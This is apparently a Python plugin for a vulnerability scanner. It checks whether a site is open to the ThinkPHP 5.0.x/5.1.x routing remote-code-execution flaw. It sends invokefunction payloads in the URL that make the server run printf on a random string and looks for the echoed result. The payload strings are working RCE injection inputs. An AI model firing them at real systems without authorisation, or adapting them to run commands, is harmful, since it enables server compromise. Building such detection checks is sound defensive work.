from plugins.base import BasePoc
from loguru import logger
import random
import string


class Poc(BasePoc):
    def __init__(self):
        super().__init__()
        self.name = "ThinkPHP 5.x Remote Code Execution"
        self.app = "ThinkPHP"  # 只有指纹识别为 ThinkPHP 时才运行
        self.severity = "Critical"
        self.desc = "检测 ThinkPHP 5.0.x/5.1.x 路由解析缺陷导致的远程代码执行漏洞。"

    async def verify(self, url, client):
        """
        核心探测逻辑：通过执行简单的数学运算验证 RCE
        """
        # 1. 构造随机字符串，用于验证执行结果，防止缓存干扰或误报
        rand_str = ''.join(random.sample(string.ascii_letters, 6))

        # 2. 构造多个版本的探测 Payload (适配不同版本的路由特征)
        payloads = [
            # 兼容 5.0.x 的常用 Payload
            r"/?s=index/\think\app/invokefunction&function=printf&vars[0]={}--%25s--",
            # 兼容 5.1.x 的常用 Payload
            r"/?s=index/\think\Container/invokefunction&function=printf&vars[0]={}--%25s--"
        ]

        for p in payloads:
            # 填充随机字符串，期望结果是输出类似 "abc--abc--"
            test_payload = p.format(rand_str)
            target_url = url.rstrip('/') + test_payload

            try:
                response = await client.get(target_url)

                # 3. 验证执行结果
                # 如果页面返回了我们构造的随机字符串拼接结果，说明函数被成功调用
                expected_output = f"{rand_str}--{rand_str}--"
                if response.status_code == 200 and expected_output in response.text:
                    return True, f"Vulnerable to ThinkPHP RCE! Evidence found with payload: {target_url}"

            except Exception as e:
                logger.debug(f"[Poc: {self.name}] 请求异常: {e}")
                continue

        return False, None